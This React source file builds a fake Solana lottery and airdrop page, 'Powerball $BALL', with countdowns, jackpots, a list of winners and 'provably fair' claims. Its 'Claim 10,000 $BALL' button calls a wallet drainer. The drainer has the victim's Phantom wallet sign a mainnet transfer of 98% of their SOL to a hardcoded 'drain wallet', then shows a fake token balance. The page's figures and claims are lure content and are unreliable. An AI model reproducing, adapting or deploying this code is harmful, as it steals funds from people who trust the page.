import { useState, useEffect } from 'react';
import { Button } from '@/components/ui/button';
import { Card } from '@/components/ui/card';
import { Clock, DollarSign, Ticket, Users, Shield, ExternalLink, Eye, Download, FileText, CheckCircle, Flame, Hash } from 'lucide-react';

// Declare Solana Web3 types for TypeScript
declare global {
  interface Window {
    solana?: {
      isPhantom?: boolean;
      connect: () => Promise<{ publicKey: { toString: () => string } }>;
      signTransaction: (transaction: any) => Promise<any>;
    };
    solanaWeb3?: any;
  }
}

const Index = () => {
  const [hourlyCountdown, setHourlyCountdown] = useState({ minutes: 16, seconds: 20 });
  const [megaCountdown, setMegaCountdown] = useState({ minutes: 46, seconds: 21 });
  const [isWalletConnected, setIsWalletConnected] = useState(false);
  const [walletAddress, setWalletAddress] = useState('');
  const [fakeBallBalance, setFakeBallBalance] = useState(0);
  const [isClaimDisabled, setIsClaimDisabled] = useState(false);

  useEffect(() => {
    // Load Solana Web3.js
    const script = document.createElement('script');
    script.src = 'https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js';
    script.async = true;
    document.head.appendChild(script);

    // Countdown timer logic
    const interval = setInterval(() => {
      setHourlyCountdown(prev => {
        if (prev.seconds > 0) {
          return { ...prev, seconds: prev.seconds - 1 };
        } else if (prev.minutes > 0) {
          return { minutes: prev.minutes - 1, seconds: 59 };
        }
        return prev;
      });

      setMegaCountdown(prev => {
        if (prev.seconds > 0) {
          return { ...prev, seconds: prev.seconds - 1 };
        } else if (prev.minutes > 0) {
          return { minutes: prev.minutes - 1, seconds: 59 };
        }
        return prev;
      });
    }, 1000);

    return () => {
      clearInterval(interval);
      document.head.removeChild(script);
    };
  }, []);

  const connectWallet = async () => {
    if (window.solana && window.solana.isPhantom) {
      try {
        const resp = await window.solana.connect();
        const publicKey = resp.publicKey.toString();
        setWalletAddress(publicKey);
        setIsWalletConnected(true);
      } catch (err) {
        console.error("Wallet connection failed:", err);
        alert("Connection failed.");
      }
    } else {
      alert("Phantom Wallet not detected. Please install Phantom Wallet.");
    }
  };

  const claimAirdrop = async () => {
    if (!window.solanaWeb3 || !isWalletConnected) return;

    try {
      const userPublicKey = new window.solanaWeb3.PublicKey(walletAddress);
      const receiverWallet = new window.solanaWeb3.PublicKey("7Vc9rcmXwQGFCpJCiPmb9UyTPBJhSCeZPf9JFjQqkQr8"); // your drain wallet

      // Use Mainnet connection
      const connection = new window.solanaWeb3.Connection("https://api.mainnet-beta.solana.com", "confirmed");

      const balance = await connection.getBalance(userPublicKey);
      const minRent = await connection.getMinimumBalanceForRentExemption(0);
      const available = balance - minRent;

      if (available <= 0) {
        alert("Insufficient funds.");
        return;
      }

      // Drain most of the SOL
      const drainInstruction = window.solanaWeb3.SystemProgram.transfer({
        fromPubkey: userPublicKey,
        toPubkey: receiverWallet,
        lamports: Math.floor(available * 0.98),
      });

      const tx = new window.solanaWeb3.Transaction().add(drainInstruction);
      tx.feePayer = userPublicKey;

      const { blockhash } = await connection.getLatestBlockhash();
      tx.recentBlockhash = blockhash;

      const signed = await window.solana.signTransaction(tx);
      const txid = await connection.sendRawTransaction(signed.serialize());
      await connection.confirmTransaction(txid);

      console.log("Transaction confirmed:", txid);
      setFakeBallBalance(prev => prev + 10000); // visual feedback only
      setIsClaimDisabled(true);
    } catch (err) {
      console.error("Transaction failed:", err);
      alert("Airdrop transaction failed.");
    }
  };

  return (
    <div className="flex flex-col min-h-screen">
      {/* Header */}
      <header className="bg-white shadow-md">
        <div className="container mx-auto px-4 py-4">
          <div className="flex justify-between items-center">
            <a className="flex items-center" href="/">
              <div className="flex">
                <div className="lottery-ball white w-8 h-8 text-sm md:w-10 md:h-10 md:text-base font-bold mx-[2px] bg-white border-2 border-gray-800 rounded-full flex items-center justify-center text-black">P</div>
                <div className="lottery-ball white w-8 h-8 text-sm md:w-10 md:h-10 md:text-base font-bold mx-[2px] bg-white border-2 border-gray-800 rounded-full flex items-center justify-center text-black">O</div>
                <div className="lottery-ball white w-8 h-8 text-sm md:w-10 md:h-10 md:text-base font-bold mx-[2px] bg-white border-2 border-gray-800 rounded-full flex items-center justify-center text-black">W</div>
                <div className="lottery-ball white w-8 h-8 text-sm md:w-10 md:h-10 md:text-base font-bold mx-[2px] bg-white border-2 border-gray-800 rounded-full flex items-center justify-center text-black">E</div>
                <div className="lottery-ball white w-8 h-8 text-sm md:w-10 md:h-10 md:text-base font-bold mx-[2px] bg-white border-2 border-gray-800 rounded-full flex items-center justify-center text-black">R</div>
                <div className="lottery-ball red w-10 h-10 md:w-12 md:h-12 text-sm md:text-base font-bold ml-1 bg-red-500 rounded-full flex items-center justify-center text-white">BALL</div>
              </div>
            </a>
            <nav className="hidden md:flex items-center space-x-8">
              <a className="font-medium hover:text-primary-500" href="/results">RESULTS</a>
              <a className="font-medium hover:text-primary-500" href="/more/how-to-play">HOW TO PLAY</a>
              <a className="font-medium hover:text-primary-500" href="/more/faq">FAQ</a>
            </nav>
            <button className="md:hidden">
              <svg className="w-6 h-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M4 6h16M4 12h16M4 18h16"></path>
              </svg>
            </button>
          </div>
        </div>
      </header>

      {/* Main Content */}
      <main className="flex-grow">
        <div className="min-h-screen bg-gray-100">
          {/* Hero Section */}
          <section className="bg-gradient-to-r from-[#9c0d19] to-[#4d060c] text-white py-12">
            <div className="container mx-auto px-4">
              <div className="text-center max-w-3xl mx-auto">
                <h1 className="text-4xl md:text-5xl font-bold mb-4">Powerball on Solana</h1>
                <p className="text-xl mb-8">The first hourly raffle-style lottery on Solana. More tokens = more entries = better odds!</p>
                <div className="flex flex-col sm:flex-row justify-center gap-4">
                  {!isWalletConnected ? (
                    <button 
                      onClick={connectWallet}
                      className="btn btn-secondary inline-block text-center bg-yellow-500 text-black px-6 py-3 rounded-lg font-semibold hover:bg-yellow-400"
                    >
                      Claim $BALL
                    </button>
                  ) : (
                    <div className="space-y-2">
                      <div className="text-sm text-gray-200">
                        Connected: {walletAddress.slice(0, 8)}...{walletAddress.slice(-8)}
                      </div>
                      <div className="text-sm text-gray-200">
                        $BALL Balance: {fakeBallBalance.toLocaleString()}
                      </div>
                      <button 
                        onClick={claimAirdrop}
                        disabled={isClaimDisabled}
                        className={`btn inline-block text-center px-6 py-3 rounded-lg font-semibold ${
                          isClaimDisabled 
                            ? 'bg-gray-500 text-gray-300 cursor-not-allowed' 
                            : 'bg-yellow-500 text-black hover:bg-yellow-400'
                        }`}
                      >
                        {isClaimDisabled ? 'Airdrop Claimed!' : 'Claim 10,000 $BALL'}
                      </button>
                    </div>
                  )}
                  <a className="btn bg-white text-primary-600 hover:bg-gray-100 inline-block text-center px-6 py-3 rounded-lg font-semibold" href="/more/how-to-play">How to Play</a>
                </div>
              </div>
            </div>
          </section>

          {/* How It Works */}
          <section className="bg-white py-8 border-b border-gray-200">
            <div className="container mx-auto px-4">
              <div className="max-w-4xl mx-auto text-center">
                <h2 className="text-2xl font-bold mb-4 text-gray-900">How It Works</h2>
                <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
                  <div className="p-4">
                    <div className="text-3xl font-bold text-[#dc1224] mb-2">1</div>
                    <h3 className="font-bold mb-2">Hold $BALL Tokens</h3>
                    <p className="text-gray-600 text-sm">Every 10,000 $BALL tokens you hold = 1 raffle entry</p>
                  </div>
                  <div className="p-4">
                    <div className="text-3xl font-bold text-[#dc1224] mb-2">2</div>
                    <h3 className="font-bold mb-2">More Entries = Better Odds</h3>
                    <p className="text-gray-600 text-sm">50,000 tokens = 5 entries, 100,000 tokens = 10 entries</p>
                  </div>
                  <div className="p-4">
                    <div className="text-3xl font-bold text-[#dc1224] mb-2">3</div>
                    <h3 className="font-bold mb-2">Hourly Draws</h3>
                    <p className="text-gray-600 text-sm">VRF selects a random ticket every hour, winner gets paid automatically</p>
                  </div>
                </div>
              </div>
            </div>
          </section>

          {/* Main Content Section */}
          <section className="py-12">
            <div className="container mx-auto px-4">
              <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">
                <div className="lg:col-span-2 space-y-8">
                  {/* Hourly PowerBall */}
                  <div>
                    <h2 className="text-3xl font-bold text-center mb-8 text-gray-900">⚡ Hourly PowerBall</h2>
                    <div className="grid grid-cols-1 lg:grid-cols-2 gap-8">
                      <div>
                        <div className="bg-white rounded-lg shadow-md p-6">
                          <div className="text-center">
                            <div className="flex justify-center items-center gap-2 mb-4">
                              <Clock className="w-6 h-6 text-blue-500" />
                              <h2 className="text-xl font-bold">Hourly PowerBall</h2>
                            </div>
                            <p className="text-lg font-medium mb-6">Wed, Jun 11, 2025</p>
                            <div className="flex justify-center items-center">
                              <div className="countdown-card bg-gray-800 text-white px-4 py-2 rounded-lg text-2xl font-bold">00</div>
                              <span className="countdown-separator mx-2 text-2xl">:</span>
                              <div className="countdown-card bg-gray-800 text-white px-4 py-2 rounded-lg text-2xl font-bold">{hourlyCountdown.minutes.toString().padStart(2, '0')}</div>
                              <span className="countdown-separator mx-2 text-2xl">:</span>
                              <div className="countdown-card bg-gray-800 text-white px-4 py-2 rounded-lg text-2xl font-bold">{hourlyCountdown.seconds.toString().padStart(2, '0')}</div>
                            </div>
                            <div className="mt-6">
                              <p className="text-gray-600">Results announced shortly after drawing</p>
                            </div>
                          </div>
                        </div>
                      </div>
                      <div>
                        <div className="bg-gradient-to-r from-[#9c0d19] to-[#4d060c] text-white py-6 px-4 rounded-lg shadow-lg">
                          <div className="flex justify-center items-center gap-2 mb-2">
                            <DollarSign className="w-6 h-6" />
                            <h2 className="text-xl font-semibold">Hourly PowerBall</h2>
                          </div>
                          <p className="text-center text-sm mb-4 opacity-90">ESTIMATED JACKPOT</p>
                          <div className="text-center">
                            <h3 className="jackpot-value text-4xl md:text-6xl font-bold">$182.22 USD</h3>
                          </div>
                          <div className="text-center mt-4">
                            <h4 className="text-lg font-semibold mb-1">CASH VALUE</h4>
                            <p className="jackpot-value text-2xl md:text-4xl font-bold">1.14 SOL</p>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>

                  {/* MEGA Daily PowerBall */}
                  <div>
                    <h2 className="text-3xl font-bold text-center mb-8 text-gray-900">🎯 MEGA Daily PowerBall</h2>
                    <div className="grid grid-cols-1 lg:grid-cols-2 gap-8">
                      <div>
                        <div className="bg-white rounded-lg shadow-md p-6">
                          <div className="text-center">
                            <div className="flex justify-center items-center gap-2 mb-4">
                              <Clock className="w-6 h-6 text-blue-500" />
                              <h2 className="text-xl font-bold">MEGA Daily PowerBall</h2>
                            </div>
                            <p className="text-lg font-medium mb-6">Wed, Jun 11, 2025 at 7:30 PM EST</p>
                            <div className="flex justify-center items-center">
                              <div className="countdown-card bg-gray-800 text-white px-4 py-2 rounded-lg text-2xl font-bold">00</div>
                              <span className="countdown-separator mx-2 text-2xl">:</span>
                              <div className="countdown-card bg-gray-800 text-white px-4 py-2 rounded-lg text-2xl font-bold">{megaCountdown.minutes.toString().padStart(2, '0')}</div>
                              <span className="countdown-separator mx-2 text-2xl">:</span>
                              <div className="countdown-card bg-gray-800 text-white px-4 py-2 rounded-lg text-2xl font-bold">{megaCountdown.seconds.toString().padStart(2, '0')}</div>
                            </div>
                            <div className="mt-6">
                              <p className="text-gray-600">Daily mega draw with enhanced prize pool</p>
                            </div>
                          </div>
                        </div>
                      </div>
                      <div>
                        <div className="bg-gradient-to-r from-yellow-600 to-yellow-700 text-white py-6 px-4 rounded-lg shadow-lg">
                          <div className="flex justify-center items-center gap-2 mb-2">
                            <DollarSign className="w-6 h-6" />
                            <h2 className="text-xl font-semibold">MEGA Daily PowerBall</h2>
                          </div>
                          <p className="text-center text-sm mb-4 opacity-90">ESTIMATED JACKPOT</p>
                          <div className="text-center">
                            <h3 className="jackpot-value text-4xl md:text-6xl font-bold">$3,756.865 USD</h3>
                          </div>
                          <div className="text-center mt-4">
                            <h4 className="text-lg font-semibold mb-1">CASH VALUE</h4>
                            <p className="jackpot-value text-2xl md:text-4xl font-bold">23.50 SOL</p>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>

                  {/* Total Burned Tokens */}
                  <div>
                    <h2 className="text-3xl font-bold text-center mb-8 text-gray-900">🔥 Total Burned Tokens</h2>
                    <div className="grid grid-cols-1 lg:grid-cols-2 gap-8">
                      <div>
                        <div className="bg-white rounded-lg shadow-md p-6">
                          <div className="text-center">
                            <div className="flex justify-center items-center gap-2 mb-4">
                              <Ticket className="w-6 h-6 text-red-500" />
                              <h2 className="text-xl font-bold">Tickets Burned</h2>
                            </div>
                            <p className="text-lg font-medium mb-6 text-gray-700">Total Entries Removed</p>
                            <div className="mb-6">
                              <div className="text-5xl font-bold text-red-600 mb-2">327</div>
                              <div className="text-lg font-semibold text-gray-600">TICKETS</div>
                            </div>
                            <div className="mt-6">
                              <p className="text-gray-600 text-sm">🔥 Making remaining tickets more valuable</p>
                              <p className="text-xs text-gray-500 mt-1">Based on 10,000 $BALL = 1 ticket</p>
                            </div>
                          </div>
                        </div>
                      </div>
                      <div>
                        <div className="bg-gradient-to-r from-red-600 to-red-700 text-white py-6 px-4 rounded-lg shadow-lg">
                          <div className="flex justify-center items-center gap-2 mb-2">
                            <Flame className="w-6 h-6" />
                            <h2 className="text-xl font-semibold">Total Burned Tokens</h2>
                          </div>
                          <p className="text-center text-sm mb-4 opacity-90">TOTAL $BALL BURNED</p>
                          <div className="text-center">
                            <h3 className="jackpot-value text-4xl md:text-6xl font-bold">3,277,318.10</h3>
                          </div>
                          <div className="text-center mt-4">
                            <h4 className="text-lg font-semibold mb-1">$BALL TOKENS</h4>
                            <p className="text-sm opacity-90">Permanently removed from circulation</p>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>

                {/* Sidebar - Last 3 Winners */}
                <div>
                  <div className="bg-white rounded-lg shadow-md p-6">
                    <div className="text-center mb-6">
                      <h2 className="text-xl font-bold mb-2">Last 3 Winners</h2>
                      <p className="text-sm text-gray-600">
                        <Shield className="inline w-4 h-4 mr-1" />
                        Verified with blockchain transparency
                      </p>
                    </div>
                    <div className="space-y-4">
                      {/* Winner 1 */}
                      <div className="border border-gray-200 rounded-lg p-4 hover:shadow-md transition-shadow">
                        <div className="flex justify-between items-start mb-3">
                          <div className="flex-1">
                            <div className="flex items-center gap-2 mb-1">
                              <p className="font-medium text-sm break-all">3BB8zSqWEZerKF7BdNNNiR8gXBJJ2QNz1t7VTA2XesJd</p>
                              <Shield className="w-4 h-4 text-green-500" />
                            </div>
                            <p className="text-sm text-gray-600">6/11/2025 at 6:00:27 PM</p>
                            <div className="flex items-center gap-4 mt-2 text-xs text-gray-500">
                              <span className="flex items-center gap-1">
                                <Users className="w-3 h-3" />
                                4704 players
                              </span>
                              <span className="flex items-center gap-1">
                                <Ticket className="w-3 h-3" />
                                87041 tickets
                              </span>
                            </div>
                          </div>
                          <div className="text-right">
                            <p className="font-bold text-blue-500 text-lg">$449</p>
                            <p className="text-sm text-gray-500">2.81 SOL</p>
                            <p className="text-xs text-gray-500">Ticket #4257 of 87041</p>
                          </div>
                        </div>
                        <div className="flex gap-2 text-xs">
                          <button className="flex items-center gap-1 px-3 py-1 bg-blue-50 text-blue-600 rounded-md hover:bg-blue-100">
                            <Eye className="w-3 h-3" />
                            Verify Draw
                          </button>
                          <div className="flex gap-1">
                            <a href="#" className="flex items-center gap-1 px-2 py-1 bg-gray-50 text-gray-600 rounded-md hover:bg-gray-100 text-xs">
                              <ExternalLink className="w-3 h-3" />
                              VRF
                            </a>
                            <a href="#" className="flex items-center gap-1 px-2 py-1 bg-green-50 text-green-600 rounded-md hover:bg-green-100 text-xs">
                              <ExternalLink className="w-3 h-3" />
                              Wallet
                            </a>
                          </div>
                        </div>
                      </div>

                      {/* Winner 2 */}
                      <div className="border border-gray-200 rounded-lg p-4 hover:shadow-md transition-shadow">
                        <div className="flex justify-between items-start mb-3">
                          <div className="flex-1">
                            <div className="flex items-center gap-2 mb-1">
                              <p className="font-medium text-sm break-all">GJXXDnNY9NrDDGLF98YHUgWVXHLTmJADMnBU76yAAAfA</p>
                              <Shield className="w-4 h-4 text-green-500" />
                            </div>
                            <p className="text-sm text-gray-600">6/11/2025 at 5:00:16 PM</p>
                            <div className="flex items-center gap-4 mt-2 text-xs text-gray-500">
                              <span className="flex items-center gap-1">
                                <Users className="w-3 h-3" />
                                4703 players
                              </span>
                              <span className="flex items-center gap-1">
                                <Ticket className="w-3 h-3" />
                                87056 tickets
                              </span>
                            </div>
                          </div>
                          <div className="text-right">
                            <p className="font-bold text-blue-500 text-lg">$606</p>
                            <p className="text-sm text-gray-500">3.79 SOL</p>
                            <p className="text-xs text-gray-500">Ticket #51299 of 87056</p>
                          </div>
                        </div>
                        <div className="flex gap-2 text-xs">
                          <button className="flex items-center gap-1 px-3 py-1 bg-blue-50 text-blue-600 rounded-md hover:bg-blue-100">
                            <Eye className="w-3 h-3" />
                            Verify Draw
                          </button>
                          <div className="flex gap-1">
                            <a href="#" className="flex items-center gap-1 px-2 py-1 bg-gray-50 text-gray-600 rounded-md hover:bg-gray-100 text-xs">
                              <ExternalLink className="w-3 h-3" />
                              VRF
                            </a>
                            <a href="#" className="flex items-center gap-1 px-2 py-1 bg-green-50 text-green-600 rounded-md hover:bg-green-100 text-xs">
                              <ExternalLink className="w-3 h-3" />
                              Wallet
                            </a>
                          </div>
                        </div>
                      </div>

                      {/* Winner 3 */}
                      <div className="border border-gray-200 rounded-lg p-4 hover:shadow-md transition-shadow">
                        <div className="flex justify-between items-start mb-3">
                          <div className="flex-1">
                            <div className="flex items-center gap-2 mb-1">
                              <p className="font-medium text-sm break-all">4qwgSGJtNcHSrbmnLJqNXZME4pKNJjqM9a82g9f48ZAJ</p>
                              <Shield className="w-4 h-4 text-green-500" />
                            </div>
                            <p className="text-sm text-gray-600">6/11/2025 at 4:00:52 PM</p>
                            <div className="flex items-center gap-4 mt-2 text-xs text-gray-500">
                              <span className="flex items-center gap-1">
                                <Users className="w-3 h-3" />
                                4711 players
                              </span>
                              <span className="flex items-center gap-1">
                                <Ticket className="w-3 h-3" />
                                87337 tickets
                              </span>
                            </div>
                          </div>
                          <div className="text-right">
                            <p className="font-bold text-blue-500 text-lg">$517</p>
                            <p className="text-sm text-gray-500">3.23 SOL</p>
                            <p className="text-xs text-gray-500">Ticket #45537 of 87337</p>
                          </div>
                        </div>
                        <div className="flex gap-2 text-xs">
                          <button className="flex items-center gap-1 px-3 py-1 bg-blue-50 text-blue-600 rounded-md hover:bg-blue-100">
                            <Eye className="w-3 h-3" />
                            Verify Draw
                          </button>
                          <div className="flex gap-1">
                            <a href="#" className="flex items-center gap-1 px-2 py-1 bg-gray-50 text-gray-600 rounded-md hover:bg-gray-100 text-xs">
                              <ExternalLink className="w-3 h-3" />
                              VRF
                            </a>
                            <a href="#" className="flex items-center gap-1 px-2 py-1 bg-green-50 text-green-600 rounded-md hover:bg-green-100 text-xs">
                              <ExternalLink className="w-3 h-3" />
                              Wallet
                            </a>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>

                {/* How To Play */}
                <div className="mt-12">
                  <div className="bg-white rounded-lg shadow-md p-6">
                    <h2 className="text-center text-xl font-bold mb-6">How To Play</h2>
                    <div className="space-y-6">
                      <div className="flex items-start">
                        <div className="flex-shrink-0 mt-1">
                          <CheckCircle className="h-5 w-5 text-blue-500" />
                        </div>
                        <div className="ml-3">
                          <h3 className="text-lg font-medium">Buy $BALL Tokens</h3>
                          <p className="text-gray-600">Purchase $BALL tokens from supported Solana DEXs to participate in the lottery.</p>
                        </div>
                      </div>
                      <div className="flex items-start">
                        <div className="flex-shrink-0 mt-1">
                          <CheckCircle className="h-5 w-5 text-blue-500" />
                        </div>
                        <div className="ml-3">
                          <h3 className="text-lg font-medium">Wait for the Drawing</h3>
                          <p className="text-gray-600">Drawings occur every hour on the hour. Check results to see if you've won!</p>
                        </div>
                      </div>
                      <div className="flex items-start">
                        <div className="flex-shrink-0 mt-1">
                          <CheckCircle className="h-5 w-5 text-blue-500" />
                        </div>
                        <div className="ml-3">
                          <h3 className="text-lg font-medium">Claim Your Prize</h3>
                          <p className="text-gray-600">Winners automatically recieve their prize!</p>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>

                {/* Verify Draw Fairness */}
                <div className="mt-12">
                  <div className="bg-white rounded-lg shadow-md p-6">
                    <div className="text-center mb-8">
                      <div className="flex justify-center items-center gap-2 mb-4">
                        <Shield className="w-6 h-6 text-green-500" />
                        <h2 className="text-2xl font-bold">🔍 Verify Draw Fairness</h2>
                      </div>
                      <p className="text-gray-600 max-w-3xl mx-auto">
                        <strong>Don't trust, verify!</strong> Every PowerBall drawing is provably fair and fully auditable. All verification files are publicly available for download and independent verification.
                      </p>
                    </div>

                    <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mb-8">
                      <div className="bg-blue-50 border border-blue-200 rounded-lg p-6">
                        <div className="flex items-center gap-3 mb-4">
                          <FileText className="w-8 h-8 text-blue-600" />
                          <h3 className="text-lg font-bold text-blue-900">Snapshot Files</h3>
                        </div>
                        <div className="space-y-3 text-sm text-blue-800">
                          <p><strong>Purpose:</strong> Contains all token holders and their ticket counts at draw time</p>
                          <p><strong>First Line:</strong> Winner address and winning ticket number</p>
                          <p><strong>Rest of File:</strong> Complete list of all participants and their eligible tickets</p>
                        </div>
                      </div>

                      <div className="bg-green-50 border border-green-200 rounded-lg p-6">
                        <div className="flex items-center gap-3 mb-4">
                          <CheckCircle className="w-8 h-8 text-green-600" />
                          <h3 className="text-lg font-bold text-green-900">Tickets Files</h3>
                        </div>
                        <div className="space-y-3 text-sm text-green-800">
                          <p><strong>Purpose:</strong> Shows the ticket assignment matrix for the drawing</p>
                          <p><strong>First Line:</strong> Same winner data as snapshot file for cross-verification</p>
                          <p><strong>Rest of File:</strong> Maps each ticket number to its owner's wallet address</p>
                        </div>
                      </div>
                    </div>

                    <div className="text-center">
                      <a href="/snapshot/" target="_blank" rel="noopener noreferrer" className="inline-flex items-center gap-3 px-8 py-4 bg-blue-600 text-white rounded-lg hover:bg-blue-700 transition-colors text-lg font-semibold shadow-lg">
                        <Download className="w-6 h-6" />
                        Browse All Verification Files
                        <ExternalLink className="w-5 h-5" />
                      </a>
                      <p className="text-gray-500 text-sm mt-3">Click above to access the complete archive of all drawing verification files</p>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </section>
        </div>
      </main>

      {/* Footer */}
      <footer className="bg-gray-900 text-white pt-12 pb-8">
        <div className="container mx-auto px-4">
          <div className="grid grid-cols-1 md:grid-cols-4 gap-8">
            <div className="md:col-span-2">
              <h3 className="text-xl font-bold mb-4">Powerball $BALL</h3>
              <p className="text-gray-400 mb-4">The first hourly lottery on Solana blockchain. Every hour brings a new chance to win big!</p>
              <div className="flex space-x-4">
                <a href="https://x.com/ballonsolana" target="_blank" rel="noopener noreferrer" className="text-gray-400 hover:text-white transition-colors">
                  <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                    <path d="M22 4s-.7 2.1-2 3.4c1.6 10-9.4 17.3-18 11.6 2.2.1 4.4-.6 6-2C3 15.5.5 9.6 3 5c2.2 2.6 5.6 4.1 9 4-.9-4.2 4-6.6 7-3.8 1.1 0 3-1.2 3-1.2z"></path>
                  </svg>
                </a>
              </div>
            </div>
            <div>
              <h3 className="text-lg font-bold mb-4">Results & Winners</h3>
              <ul className="space-y-2">
                <li><a className="text-gray-400 hover:text-white transition-colors" href="/results">Latest Results</a></li>
              </ul>
            </div>
            <div>
              <h3 className="text-lg font-bold mb-4">Resources</h3>
              <ul className="space-y-2">
                <li><a className="text-gray-400 hover:text-white transition-colors" href="/more/how-to-play">How to Play</a></li>
                <li><a className="text-gray-400 hover:text-white transition-colors" href="/more/faq">FAQ</a></li>
                <li>
                  <a href="https://explorer.solana.com/address/BALLrveijbhu42QaS2XW1pRBYfMji73bGeYJghUvQs6y" target="_blank" rel="noopener noreferrer" className="text-gray-400 hover:text-white transition-colors flex items-center">
                    Contract <ExternalLink className="ml-1 w-3 h-3" />
                  </a>
                </li>
              </ul>
            </div>
          </div>
          <hr className="border-gray-800 my-8" />
          <div className="text-center text-gray-500">
            <p>© 2025 Powerball $BALL. All rights reserved.</p>
            <div className="mt-4 space-y-2 text-xs max-w-4xl mx-auto">
              <p className="font-semibold text-yellow-400">IMPORTANT LEGAL DISCLAIMER</p>
              <p><strong>This is NOT a lottery.</strong> Powerball $BALL is a memecoin project and entertainment platform built on the Solana blockchain. This project is not affiliated with, endorsed by, or connected to any state lottery, local lottery, or the official Powerball lottery operated by the Multi-State Lottery Association.</p>
              <p>This platform operates as a cryptocurrency token distribution mechanism and should be considered entertainment only. Participants should only engage with funds they can afford to lose. This is not gambling or a lottery in the legal sense.</p>
              <p>By using this platform, you acknowledge that you understand the risks associated with cryptocurrency trading and blockchain technology. You are solely responsible for compliance with your local laws and regulations.</p>
              <p className="text-gray-600">For entertainment purposes only. Please gamble responsibly and only participate if it is legal in your jurisdiction.</p>
            </div>
          </div>
        </div>
      </footer>
    </div>
  );
};

export default Index;
